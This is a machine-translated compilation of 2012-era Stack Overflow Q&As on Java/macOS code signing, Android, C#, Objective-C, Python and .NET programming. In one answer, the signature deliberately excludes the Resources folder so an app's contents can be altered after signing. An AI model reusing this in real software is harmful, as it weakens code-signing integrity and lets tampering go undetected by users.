> 
> 时间：2012-07-31T08:48:44.463
> 
> 标签：java, linux, code-signing, osx-mountain-lion

对于 OS X，我在 DMG 中分发我的 Java 应用程序。自 Mountain Lion 发布以来，打开应用程序会显示以下错误消息：

> [应用名称] 已损坏，无法打开。您应该弹出磁盘映像。

[显然解决方法是签署 .app 文件](https://blogs.oracle.com/talkingjavadeployment/entry/java_applications_and_gatekeeper)，所以我阅读了[Code Signing Guide](https://developer.apple.com/library/mac/#documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html#//apple_ref/doc/uid/TP40005929-CH4-SW2)。**除了如何将其集成到我的一键构建过程中这一**重要问题之外，一切似乎都很简单。

在所有平台上构建我的产品都是在我的 Linux 开发机器上进行的。我运行一个 Ant 脚本，Windows 安装程序、启动程序 EXE、Linux 安装程序、OS X 应用程序和 DMG 都已构建。所以我想将代码签名集成到这个过程中。

Linux是否有相当于“代码设计”的东西？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-28T09:40:29.487

没有记录在 Linux 中对 Mac OS X 应用程序进行代码签名的方法。

到目前为止，我发现这样做的唯一方法是将 SSH 连接到 Mac 并使用它。

另一方面，根据@Steve McLeod ( [https://stackoverflow.com/a/55906962/28190](https://stackoverflow.com/a/55906962/28190) )，安装程序包 install4j 确实提供了这个：

> **Windows 和 Mac OS X 上的集成代码签名**。在“常规设置”部分，install4j 现在有一个“代码签名”选项卡，您可以在其中为 Windows 和 Mac OS X 配置代码签名证书。代码签名将应用于相应媒体文件中的所有启动器和安装程序应用程序。代码签名的实现是跨平台的，例如，您可以从 Linux 构建服务器对 Windows 和 Mac OS X 媒体文件进行签名。

所以技术上应该是可行的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-04-29T15:59:48.640

我使用名为[install4j](https://www.ej-technologies.com/products/install4j/overview.html)的产品为我的应用程序创建 DMG 文件。它在 DMG 文件中正确地对应用程序进行编码，并且可以从 macOS 以外的操作系统执行此操作。

不过警告：install4j 不是免费软件，而且实际上非常昂贵。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T08:22:10.297

您可以通过仅对应用程序的 JavaApplicationStub 和 info.plist 进行签名并从签名中排除“Resources”文件夹来解决此问题。然后，您必须更改构建过程以使用预签名容器。当然，这不是代码设计的意义，但它会起作用；-)

为此，请执行以下步骤：

*   像往常一样创建你的 .app
*   将其移至您的 Mac
*   创建一个包含以下内容的文件“ResourceRules.plist”：

资源规则.plist：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>rules</key>
        <dict>
                <key>^Resources/</key>
                <false/>
                <key>^version.plist$</key>
                <true/>
        </dict>
</dict>
</plist> 
```

*   现在使用以下命令签名： CODESIGN_ALLOCATE="/Applications/Xcode.app/Contents/Developer/usr/bin/codesign_allocate" codesign -s "Certificate Name" --resource-rules ResourceRules.plist -fv MyApp.app

*   然后删除 Resource 中的所有内容并验证签名（代码设计 -v -v MyApp.app）。你会看到它仍然有效

*   在构建过程中使用完整的签名存根。您可以更改资源中的所有内容，但不能更改 info.plist。

# android - 实时录制期间的人脸跟踪

> ID：11736373
> 
> 赞同：0
> 
> 时间：2012-07-31T08:49:09.490
> 
> 标签：android, android-mediarecorder

我试图让同时使用 camera.startFaceDetection 和 mediaRecorder.start 成为可能。

但它总是崩溃，这种情况有什么理想的吗？

我想知道是否可以在媒体录制期间进行面部跟踪。

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T15:58:08.533

是的，我相信这是可能的（当然在 ICS 上），但我不确定 MediaRecorder 是否可能。

ICS 相机应用程序有它自己的基于媒体记录器编程模型的 EffectsRecorder.java 类（这就是我怀疑 MediaRecorder 不起作用的原因）。它用于 Goofy 面部效果的图形位于 packages/apps/Camera/res/raw/goofy_face.graph 中的 goofy_face.graph 中。您可以在 ICS SDK 中找到这些文件。

通过修改 system/media/mca/samples/CameraEffectsRecordingSample 中的过滤器图来创建和使用我自己的效果，我感到非常高兴。

注意：在我的 Nexus SI 上获得愚蠢的面部效果，但不是背景替换效果，我认为您需要一些硬件支持才能正常工作。

# c# - 与 C# 中文本框的 Validated 或 Leave 事件相关的问题

> ID：11736375
> 
> 赞同：0
> 
> 时间：2012-07-31T08:49:15.497
> 
> 标签：c#, .net, winforms

我在 Textbox Validated 事件上编写了以下代码：

```
 private void txtHbhakt1_Validated(object sender, EventArgs e)
        {

              //MessageBox.Show("Validated");
            txtHbhakt1.AutoCompleteCustomSource.Add("abcd");
            txtHbhakt1.AutoCompleteCustomSource.Add("abcd1");
            txtHbhakt1.AutoCompleteCustomSource.Add("abcd2");
            txtHbhakt1.AutoCompleteCustomSource.Add("abcd3");           

        } 
```

我运行应用程序并在文本框上按 TAB 键.. 它什么也没发生.. 为什么？每当我在文本框 TAB 键的 Validated 或 Leave 事件上使用 autocompleteCustomSource 时都不起作用.. 解决方案是什么？

谢谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T14:49:47.463

当您在验证事件期间更新自定义源时，Tab 键操作似乎会出现冲突的顺序。

一个简单的解决方法是在事件过去*后添加源。*使用`BeginInvoke`似乎可以解决问题：

```
void txtHbhakt1_Validated(object sender, EventArgs e) {
  BeginInvoke(new Action(() => txtHbhakt1.AutoCompleteCustomSource.Add("abcd")));
  BeginInvoke(new Action(() => txtHbhakt1.AutoCompleteCustomSource.Add("abcd1")));
  BeginInvoke(new Action(() => txtHbhakt1.AutoCompleteCustomSource.Add("abcd2")));
  BeginInvoke(new Action(() => txtHbhakt1.AutoCompleteCustomSource.Add("abcd3")));
} 
```

# struts2 - 如何处理struts2中的所有请求（包括斜杠）

> ID：11736379
> 
> 赞同：0
> 
> 时间：2012-07-31T08:49:32.030
> 
> 标签：struts2, struts, request, action, xss

我不知道如何处理 struts2 中的所有请求（包括点和斜杠）。我试过了：

```
action name="*" 
```

和

```
action name="*/*" 
```

它适用于包含一个斜线但不包含多个斜线的请求。

# c# - c#中的多个字符串替换

> ID：11736382
> 
> 赞同：1
> 
> 时间：2012-07-31T08:49:41.093
> 
> 标签：c#, regex

我正在动态编辑一个正则表达式以匹配 pdf 中的文本，它可以在某些行的末尾包含连字符。

例子：

源字符串：

```
"consecuti?vely" 
```

替换规则：

```
 .Replace("cuti?",@"cuti?(-\s+)?")
 .Replace("con",@"con(-\s+)?")
 .Replace("consecu",@"consecu(-\s+)?") 
```

期望的输出：

```
"con(-\s+)?secu(-\s+)?ti?(-\s+)?vely" 
```

替换规则是动态构建的，这只是一个导致问题的例子。

执行这种多次替换的最佳解决方案是什么，它将产生所需的输出？

到目前为止，我考虑过使用 Regex.Replace 并压缩单词以替换为可选 (-\s+)？在每个字符之间，但这不起作用，因为要替换的单词在正则表达式上下文中已经包含特殊含义的字符。

**编辑：我当前的代码，当替换规则重叠时不起作用，如上面的示例**

```
private string ModifyRegexToAcceptHyphensOfCurrentPage(string regex, int searchedPage)
    {
        var originalTextOfThePage = mPagesNotModified[searchedPage];
        var hyphenatedParts = Regex.Matches(originalTextOfThePage, @"\w+\-\s");
        for (int i = 0; i < hyphenatedParts.Count; i++)
        {
            var partBeforeHyphen = String.Concat(hyphenatedParts[i].Value.TakeWhile(c => c != '-'));

            regex = regex.Replace(partBeforeHyphen, partBeforeHyphen + @"(-\s+)?");
        }
        return regex;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T11:07:17.923

这个程序的输出是 "con(-\s+)?secu(-\s+)?ti?(-\s+)?vely"; 据我了解您的问题，我的代码可以完全解决您的问题。

```
class Program
    {
        class somefields
        {
            public string first;
            public string secound;
            public string Add;
            public int index;
            public somefields(string F, string S)
            {
                first = F;
                secound = S;
            }

        }
    static void Main(string[] args)
    {
        //declaring output
        string input = "consecuti?vely";
        List<somefields> rules=new List<somefields>();
        //declaring rules
        rules.Add(new somefields("cuti?",@"cuti?(-\s+)?"));
        rules.Add(new somefields("con",@"con(-\s+)?"));
        rules.Add(new somefields("consecu",@"consecu(-\s+)?"));
        // finding the string which must be added to output string and index of that
        foreach (var rul in rules)
        {
            var index=input.IndexOf(rul.first);
            if (index != -1)
            {
                var add = rul.secound.Remove(0,rul.first.Count());
                rul.Add = add;
                rul.index = index+rul.first.Count();
            }

        }
        // sort rules by index
        for (int i = 0; i < rules.Count(); i++)
        {
            for (int j = i + 1; j < rules.Count(); j++)
            {
                if (rules[i].index > rules[j].index)
                {
                    somefields temp;
                    temp = rules[i];
                    rules[i] = rules[j];
                    rules[j] = temp;
                }
            }
        }

        string output = input.ToString();
        int k=0;
        foreach(var rul in rules)
        {
            if (rul.index != -1)
            {
                output = output.Insert(k + rul.index, rul.Add);
                k += rul.Add.Length;
            }
        }
        System.Console.WriteLine(output);
        System.Console.ReadLine();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:52:49.223

您可能应该编写自己的解析器，它可能更容易维护:)。

如果字符串不包含它，也许您可​​以在模式周围添加“特殊字符”以像“##”一样保护它们。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-31T10:21:57.843

试试这个：

```
var final = Regex.Replace(originalTextOfThePage, @"(\w+)(?:\-[\s\r\n]*)?", "$1"); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-31T11:32:02.047

我不得不放弃一个简单的解决方案，自己编辑了正则表达式。作为副作用，新方法只通过字符串两次。

```
private string ModifyRegexToAcceptHyphensOfCurrentPage(string regex, int searchedPage)
    {
        var indexesToInsertPossibleHyphenation = GetPossibleHyphenPositions(regex, searchedPage);
        var hyphenationToken = @"(-\s+)?";
        return InsertStringTokenInAllPositions(regex, indexesToInsertPossibleHyphenation, hyphenationToken);
    }

    private static string InsertStringTokenInAllPositions(string sourceString, List<int> insertionIndexes, string insertionToken)
    {
        if (insertionIndexes == null || string.IsNullOrEmpty(insertionToken)) return sourceString;

        var sb = new StringBuilder(sourceString.Length + insertionIndexes.Count * insertionToken.Length);
        var linkedInsertionPositions = new LinkedList<int>(insertionIndexes.Distinct().OrderBy(x => x));
        for (int i = 0; i < sourceString.Length; i++)
        {
            if (!linkedInsertionPositions.Any())
            {
                sb.Append(sourceString.Substring(i));
                break;
            }
            if (i == linkedInsertionPositions.First.Value)
            {
                sb.Append(insertionToken);
            }
            if (i >= linkedInsertionPositions.First.Value)
            {
                linkedInsertionPositions.RemoveFirst();
            }
            sb.Append(sourceString[i]);
        }
        return sb.ToString();
    }

    private List<int> GetPossibleHyphenPositions(string regex, int searchedPage)
    {
        var originalTextOfThePage = mPagesNotModified[searchedPage];
        var hyphenatedParts = Regex.Matches(originalTextOfThePage, @"\w+\-\s");
        var indexesToInsertPossibleHyphenation = new List<int>();
        //....
        // Aho-Corasick to find all occurences of all 
        //strings in "hyphenatedParts" in the "regex" string
        // ....
        return indexesToInsertPossibleHyphenation;
    } 
```

# android - Android填写PDF表格

> ID：11736384
> 
> 赞同：13
> 
> 时间：2012-07-31T08:49:47.103
> 
> 标签：android, pdf, pdf-generation

我有**.pdf**文件，并且有多种表格。我想打开我的 .pdf 文件，填写表格并将其从 Android 开发中保存。

是否有任何用于 Android 渲染的 API。我找到了 iText，但我只是设法创建新的 pdf，然后我可以填写表格。表示我创建的将填写哪个 .pdf 文件。我需要用自己的 .pdf 格式填写表格。

在此先感谢...任何帮助将不胜感激...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T16:25:14.003

[DynamicPDF Merger for Java](http://www.dynamicpdf.com/Products/DynamicPDFforJava/Merger.csp)允许您这样做。您可以获取现有的 PDF 文档，填写表单字段值，然后输出新填写的 PDF。

dynamicpdf.com 最近有一篇关于在 Android 应用程序中设置 DynamicPDF for Java 并从中创建简单 PDF 的博客文章，[http://www.dynamicpdf.com/Blog/post/2012/06/15/Generating- PDFs-Dynamically-on-Android.aspx](http://www.dynamicpdf.com/Blog/post/2012/06/15/Generating-PDFs-Dynamically-on-Android.aspx)。

您可以轻松地将该示例更进一步，并使用它来完成您的表单填写任务。以下（未经测试）代码是使用 DynamicPDF Merger for Java 在 Android 设备上填充现有 PDF 的示例：

```
InputStream inputStream = this.getAssets().open("PDFToFill.pdf");
long avail = inputStream.available();
byte[] samplePDF = new byte[(int) avail];
inputStream.read(samplePDF , 0, (int) avail);
inputStream.close();
PdfDocument objPDF = new PdfDocument(samplePDF);    

MergeDocument document = new MergeDocument(objPDF);
document.getForm().getFields().getFormField("FormField1").setValue("My Text");
document.draw("[PhysicalPath]/FilledPDF.pdf"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-05-23T21:14:55.320

当前 Android 平台（包括 Android P）上的原生 PDF 支持不公开任何用于填写表单的控件。诸如 PSPDFKit 之类的第 3 方 PDF SDK 填补了这一空白，并允许以[编程方式填写 PDF 表单](https://pspdfkit.com/guides/android/current/forms/form-filling/)：

```
List<FormField> formFields = document.getFormProvider().getFormFields();
for (FormField formField : formFields) {
    if (formField.getType() == FormType.TEXT) {
        TextFormElement textFormElement = (TextFormElement) formField.getFormElement();
        textFormElement.setText("Test " + textFormElement.getName());
    } else if (formField.getType() == FormType.CHECKBOX) {
        CheckBoxFormElement checkBoxFormElement = (CheckBoxFormElement)formField.getFormElement();
        checkBoxFormElement.toggleSelection();
    }
} 
```

（如果您单击上面的链接，还有一个 Kotlin PDF 表单填写示例。）

请注意，市场上的大多数 SDK 都专注于 PDF AcroForms，而不是 XFA 规范，后者在 PDF 2.0 规范中已被[弃用。](https://en.wikipedia.org/wiki/XFA)

# objective-c - NSMutableDictionary 返回空的 NSMutableArray

> ID：11736385
> 
> 赞同：0
> 
> 时间：2012-07-31T08:49:53.297
> 
> 标签：objective-c, nsmutablearray, nsmutabledictionary

在 mouseDown 和 mouseDragged 处：

```
locll = [self convertPoint: [event locationInWindow] fromView:nil];
NSValue *locationValuell = [NSValue valueWithPoint:locll];
[vertices addObject:locationValuell]; 
```

在 mouseUp

```
NSString *index = [NSString stringWithFormat:@"%d", aIndex++];
[aDict setObject:vertices forKey:index];
NSArray *allKeys = [aDict allKeys];
NSLog(@"dict count: %ld", [allKeys count]);
NSString *index1 = [NSString stringWithFormat:@"%d", aIndex];
NSMutableArray *a = [aDict objectForKey:index1];
NSLog(@"a count:%li", [a count]); 
```

在 initWithCoder

```
int aIndex = 0; 
```

dict count 返回有多少对象存储在字典中。它有效。但是后来当我尝试从字典中取回数组时，我检查了数组中有多少对象（[a count]）并且它返回 0。所以我猜 NSMutableDictionary 清空了我的 NSMutableArray，或者我以错误的方式取回它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:24:29.037

这里

```
NSString *index = [NSString stringWithFormat:@"%d", aIndex++]; 
```

您`aIndex` **在**使用它后递增（后递增）。所以如果`index`是“0”，那么`index1`将是“1”。所以

```
NSMutableArray *a = [aDict objectForKey:index1]; 
```

返回`nil`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:25:45.260

在将 aIndex 用于保存 aDict 中的顶点后，您将 aIndex 增加 1。并且在它（aIndex）增加 1 之后访问这个键。当然，你的 aDict 不包含该键的任何数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:29:59.220

试试这个：

```
 NSMutableArray *a=[NSMutableArray arrayWithObjects:[aDict objectForKey:index1], nil]; 
```

它应该是工作。

# iphone - 调整 UIPickerView 的大小

> ID：11736394
> 
> 赞同：1
> 
> 时间：2012-07-31T08:50:24.933
> 
> 标签：iphone, ios, ipad, uipickerview

我正在尝试在 UIAlertView 中创建 UIPickerView，我编写了以下代码

```
UIAlertView *alert = [[UIAlertView alloc] initWithFrame:CGRectMake(0, 0, 300, 200)];

alert.title = @"Preferences";
alert.message = @"\n\n\n\n\n\n\n";
alert.delegate = self;
[alert addButtonWithTitle:@"Cancel"];
[alert addButtonWithTitle:@"OK"];

UIPickerView *myPickerView = [[UIPickerView alloc] initWithFrame:CGRectZero];
myPickerView.delegate = self;
myPickerView.showsSelectionIndicator = YES;
myPickerView.autoresizingMask = UIAlertViewStyleDefault;

myPickerView.frame = CGRectMake(10, 40, 250, 150);

[alert addSubview:myPickerView];

[alert show]; 
```

但是在运行时，pickerView 的大小不适合警报视图，它看起来如图所示。

[这里图片](http://dt-works.com/emy/Screen%20Shot%202012-07-31%20at%2010.44.12%20AM.png)

我该如何解决这个问题？提前致谢。

* * *

我解决了，我发现我有以下代码

```
- (CGFloat)pickerView:(UIPickerView *)pickerView widthForComponent:(NSInteger)component    {
int sectionWidth = 300;

return sectionWidth;
} 
```

当我删除它时，它修复了。:) 感谢所有试图帮助我的人，我为我的错误感到非常抱歉。:$

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:00:25.987

我有类似的要求。但我无法使用“UIPickerView”成功。所以我搬到了“AFPickerView”。可能对你也有帮助！！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:56:22.293

You can not resize pickerView height only change width and x and y coordinates Or you have to make alertview big eno

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:07:18.250

我严重质疑这种风格。此外，我认为您实际上无法更改 UIAlertView 的大小。我建议您使用表单演示执行模态 segue，以显示一个 UIView，您在其中放置了一个 UIPickerview 并带有一些按钮来确认或取消。您可以使用 StoryBoard 或手动对其进行编程。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T11:00:57.193

更改 xib 中的宽度。为此，您需要以 XML 形式打开 Xib 并找到 PickerView 并更改宽度并保存，运行。希望这将工作！

# python - 在 Python 中的对象上应用函数列表

> ID：11736407
> 
> 赞同：18
> 
> 时间：2012-07-31T08:51:06.930
> 
> 标签：python, functional-programming

是否有任何干净的方法可以在没有 lambda 或列表理解的情况下在 Python 中的对象上应用函数列表？就像 Haskell 表达式：

```
map ($ obj) [foo1,foo2] 
```

Python中的lambda示例：

```
response = map(lambda foo:foo(obj),[foo1,foo2]) #fooX:object->Bool 
```

它可以扩展到类函数吗？

也许来自运营商或 itertools 的东西？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-07-31T09:11:30.483

您总是可以创建一个函数来为您处理它：

```
def map_funcs(obj, func_list):
    return [func(obj) for func in func_list]

    # I was under the impression that the OP wanted to compose the functions,
    # i.e. f3(f2(f1(f0(obj))), for which the line below is applicable:
    # return reduce(lambda o, func: func(o), func_list, obj)

map_funcs(it, [Buy, Use, Break, Fix]) 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-07-31T09:24:00.643

我认为这应该符合您的“功能”标准，要回答您的问题，我认为没有一种干净的方法，您应该适应列表理解。

正如@JFSebastian 所建议的那样

```
>>> from operator import methodcaller
>>> funcs = (lambda x: x + 1, lambda x: x + 2)
>>> obj = 5
>>> list(map(methodcaller('__call__', obj), funcs))
[6, 7] 
```

这是一种疯狂的做法：

```
>>> from itertools import starmap, repeat
>>> from types import FunctionType
>>> funcs = (lambda x: x + 1, lambda x: x + 2)
>>> obj = 5
>>> list(starmap(FunctionType.__call__, zip(funcs, repeat(obj))))
[6, 7] 
```

正如@AleksiTorhamo 所建议的那样

```
>>> from itertools import repeat
>>> from types import FunctionType
>>> obj = 5
>>> funcs = (lambda x: x + 1, lambda x: x + 2)
>>> list(map(FunctionType.__call__, funcs, repeat(obj)))
[6, 7] 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-12-30T11:38:35.010

问题是缺少的`$`运算符，它由以下简单定义

```
def apply(f, a):
    return f(a) 
```

然后可以`($ obj)`像这样在python中使用部分进行currying：`partial(apply, a=obj)`

有了这个，我们可以做一个地图应用

```
map(partial(apply, a=obj), [foo1, foo2])) 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-07-31T09:10:29.300

我认为列表推导是基于另一个列表构建一个列表的最佳方式。从列表中应用常规函数非常容易：

```
results = [f(obj) for f in funcList] 
```

如果您一次不需要整个结果列表，而只需要一次迭代一个项，则生成器表达式可能会更好：

```
genexp = (f(obj) for f in funcList)
for r in genexp:
    doSomething(r) 
```

如果您的函数是方法，而不是基本函数，则有两种方法：

使用绑定方法，在这种情况下，您在进行函数调用时根本不需要提供对象：

```
obj = SomeClass()
funcList = [obj.foo1, obj.foo2]
results = [f() for f in funcList] 
```

或者使用未绑定的方法，它们是简单的常规函数​​，它们需要一个定义它们的类的实例作为它们的第一个参数（通常命名为`self`）：

```
funcList = [SomeClass.foo1, SomeClass.foo2]
obj = SomeClass()
results = [f(obj) for f in funcList] 
```

当然，如果你不需要捕获函数的结果，最简单的方法是简单地写一个循环：

```
for f in funcList:
    f(obj) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-02-09T17:49:11.067

该库`toolz`有一个`compose`功能可以做到这一点。

```
from toolz import compose
compose(foo1, foo2)(obj) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-10-10T17:10:37.107

这是我的解决方案：

```
def plus(i):
    return i+i

def mult(i):
    return i*4

functions = [plus,mult]

result=[]

for i in ["a","b","c","d"]:
    for j in functions:
        result.append(j(i)) 
```

结果输出[16]：['aa'，'aaaa'，'bb'，'bbbb'，'cc'，'cccc'，'dd'，'dddd']

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-09-09T14:34:58.777

我认为这个问题可以通过两种方式阅读，将函数列表应用于对象并产生列表中每个函数的结果（**单输入，多输出**）**或**按顺序将函数列表应用于对象（单**输入，单输出**）。

后者由 compose 函数解决，或者通过定义您自己的函数来解决：

```
def compz(t, funcs):
  return t if not funcs else compz(funcs[0](t), funcs[1:])

print(compz("str", [lambda x: x+"A", lambda x: x+"B", lambda x: x+"C"]))
print(compz("Hello, World", [lambda x: f"<h1>{x}</h1>", lambda x: f"<body>{x}</body>", lambda x: f"<html>{x}</html>",]))
print(compz(2, [lambda x: x+2, lambda x: x+5, lambda x: x+7]))
print(compz(2, [lambda x: x**2, lambda x: x**2, lambda x: x**2]))
print(compz(2, [lambda x: x**2, lambda x: x**2]))
print(compz(2, [lambda x: x**2]))
print(compz(2, []))

strABC
<html><body><h1>Hello, World</h1></body></html>
16
256
16
4
2 
```

后者的大多数答案都是等价的，但实际上是列表理解，因为这些函数不是按顺序“并行”应用的，或者因为您必须导入单独的库。查看一些答案，这可能取决于您的结果应该是什么样子，即您可以拥有

```
func_list = [lambda x: x+"A", lambda x: x+"B", lambda x: x+"C"]

print([f("str") for f in func_list])
print([f for f in map(lambda f: f("str"), func_list)])

from functools import partial

def apply(f, a):
    return f(a)

print([f for f in map(partial(apply, a="str"), func_list)])

def map_funcs(obj, func_list):
    return [func(obj) for func in func_list]

print(map_funcs("str", func_list)) 
```

在所有这些情况下，结果是：

```
['strA', 'strB', 'strC'] 
```

# .net - 用于 VS 2005 和 2010 的 MySQL 数据提供程序

> ID：11736415
> 
> 赞同：0
> 
> 时间：2012-07-31T08:51:23.963
> 
> 标签：.net, mysql, visual-studio-2010, visual-studio-2005, mysql-connector

我的机器上安装了 VS 2005（用于旧版应用程序）和 VS 2010（用于新开发）。为了通过服务器资源管理器连接 mysql 以获取类型化的数据集，我安装了连接器 6.5.4（最近）。它出现在 VS 2010 服务器资源管理器中（服务器资源管理器 -> 添加连接 -> 更改 -> 选择数据源 ->（MySQL 数据提供者））。但它没有出现在 VS 2005 中。是否有解决方法/解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:57:26.473

i am not getting your question clearly may be this will help you..

```
Check For Refernece to : System.Data.DataSetExtensions 
```

## Code

```
 using System.Data.Odbc;

 private const string ConnStr = "Driver={MySQL ODBC 3.5 Driver};Server=localhost;Database=test;uid=root;pwd=;option=3"; 
```

# android - 如何在android中实现Authorize.net？

> ID：11736417
> 
> 赞同：2
> 
> 时间：2012-07-31T08:51:28.583
> 
> 标签：android, authorize.net

我想创建一个信用卡应用程序以使用 Authorize.net 支付网关在 Android 中进行支付。

我在这里从 Authorize.net找到了一些[示例代码）。](https://developer.authorize.net/integration/fifteenminutes/android)

我按照说明进行了操作，但是在第 2 步中，我无法将其 sdk 作为库添加到另一个项目中。当我将新项目创建为“ExampleActivity.java”并按照说明使用此代码时，我在 AuthNet 对象和 Environment.SANDBOX 上出现红线错误

任何人都可以帮助我如何在没有错误的情况下实现此代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-22T07:11:22.540

*   将Authrized_net_lib 项目添加为库项目
*   在你的项目中添加 jar 文件 authorize_net_lib jar 文件
*   然后清理项目
*   现在复制并粘贴给定的示例代码

它不会给出错误。

# xml - 无法将颜色加载/检索到 Datagridview（“使用 XML 在 Datagridview 中保存和检索颜色”）

> ID：11736418
> 
> 赞同：1
> 
> 时间：2012-07-31T08:51:32.280
> 
> 标签：xml, vb.net, datagridview, colors

我的问题是我无法从我的 XML 文件中检索颜色并将其加载到 datagridview 中（在 EVENT：FORMTES3_LOAD 上）。应用程序没有失败，但我的 Datagridview 的显示变得不规则/异常。

注意：组件是windows窗体（1个单元-“FormTes3”），colordialog（1个单元-“ColorDialog1”）和datagridview（1个单元-“Datagridview1”）

以下是我的完整源代码：

```
Imports System
Imports System.IO
Imports System.Xml

Public Class FormTes3

Dim rowClicked As Integer
Dim colorName As String

Dim Doc As New XmlDocument

Private Sub FormTes3_Load(sender As Object, e As System.EventArgs) Handles Me.Load

    Doc.AppendChild(Doc.CreateElement("DataGridView"))

    ' Populate the grid
    DataGridView1.Columns.Add("Column1", "Column 1")
    DataGridView1.Columns.Add("Column2", "Column 2")
    DataGridView1.Columns.Add("Column3", "Column 3")

    DataGridView1.Rows.Add("A", "B", "C")
    DataGridView1.Rows.Add("A", "B", "C")
    DataGridView1.Rows.Add("A", "B", "C")
    DataGridView1.Rows.Add("A", "B", "C")
    DataGridView1.Rows.Add("A", "B", "C")

    If System.IO.File.Exists((Application.StartupPath + "\test.xml")) Then
        Dim row As Integer
        'Dim column As Integer
        Dim backColor As String
        Dim docLoad As New XmlDocument

        docLoad.Load((Application.StartupPath + "\test.xml"))

        For Each node As XmlNode In docLoad.SelectNodes("//Row")
            row = Convert.ToInt32(node.Attributes("rowID").InnerText)
            MsgBox(row)

            backColor = node.FirstChild.Attributes("BackColor").InnerText
            MsgBox(backColor)

            DataGridView1.Rows(row).DefaultCellStyle.BackColor = ColorTranslator.FromHtml(backColor)

          Next

    End If

End Sub

Private Function GetHexColor(ByVal colorObj As System.Drawing.Color) As String
    Return "#" & Hex(colorObj.R) & Hex(colorObj.G) & Hex(colorObj.B)
End Function

Private Sub CreateNewColorElement(ByVal rowID As Integer)

    'Create Row Node & ID Attribute
    Dim rowNode As XmlNode = Doc.CreateElement("Row")
    Dim idAttribute As XmlAttribute = Doc.CreateAttribute("rowID")
    idAttribute.Value = rowID.ToString
    rowNode.Attributes.Append(idAttribute)

    'Column Node
    Dim columnNode As XmlNode = Doc.CreateElement("Profile")

    'BackColor
    Dim backColor As XmlAttribute = Doc.CreateAttribute("BackColor")
    backColor.Value = colorName
    columnNode.Attributes.Append(backColor)

    rowNode.AppendChild(columnNode)
    Doc.DocumentElement.AppendChild(rowNode)

End Sub

Private Sub DataGridView1_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles DataGridView1.MouseUp

    Dim result As DialogResult

    If e.Button = Windows.Forms.MouseButtons.Right Then

        rowClicked = DataGridView1.HitTest(e.Location.X, e.Location.Y).RowIndex
        MsgBox("row Click: " & rowClicked)

        result = ColorDialog1.ShowDialog()

        If result = DialogResult.OK Then

            Dim rowIndex As Integer = rowClicked

            DataGridView1.Rows(rowClicked).DefaultCellStyle.BackColor = ColorDialog1.Color   'Running Well

            colorName = GetHexColor(ColorDialog1.Color)

            'If (Not (GlobalVariables.ColorStr) Is Nothing) Then
            CreateNewColorElement(rowIndex) 
            'End If

        ElseIf result = DialogResult.Cancel Then

            Return

        End If

    End If

End Sub

Private Sub FormTes3_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
    Dim saveFile As SaveFileDialog = New SaveFileDialog
    saveFile.InitialDirectory = Application.StartupPath
    saveFile.Filter = "XML files (*.xml)|*.xml"

    Dim dr As DialogResult = DialogResult.Yes

    If (MessageBox.Show("Do you want to save XML Style?", "Grid Style", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = dr) Then

        If (saveFile.ShowDialog = DialogResult.OK) Then
            Doc.Save(saveFile.FileName)
        End If

    End If

End Sub

End Class 
```

# jfreechart - 带有类别而不是时间线的烛台图 jfreechart

> ID：11736419
> 
> 赞同：1
> 
> 时间：2012-07-31T08:51:36.490
> 
> 标签：jfreechart

默认情况下，烛台图表获取带有时间线的数据集，是否还有一个数据集实现，我可以将字符串（类别名称）放在 x 轴上而不是日期上？

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T17:44:38.003

`BoxAndWhiskerRenderer`浮现在脑海中；[这里](https://stackoverflow.com/a/6849654/230513)有一个例子和下面的插图。

![图片](../Images/3991b36a37cf39a232b4b0e5de2a31b8.png)

# thread-safety - glib 回调和线程安全

> ID：11736421
> 
> 赞同：3
> 
> 时间：2012-07-31T08:51:41.767
> 
> 标签：thread-safety, gtk, pygtk, glib

*请注意，我使用的是 Python，但这可能适用于 glib 中的任何其他绑定。*

`glib.io_add_watch()`我有一个类，它通过和一个回调方法设置多个套接字连接`foo()`。此外，我有一个`glib.idle_add()`回调到一个名为`bar()`. `foo()`创建或更新可以是任何值（包括无）的元素列表（类成员）。 `bar()`从上面的列表中删除任何 None 项目——我们已经完成了这些，我们不再关心。实际上，它清理了一切。

glib 是否允许每个线程在任何时候只调用一个回调？

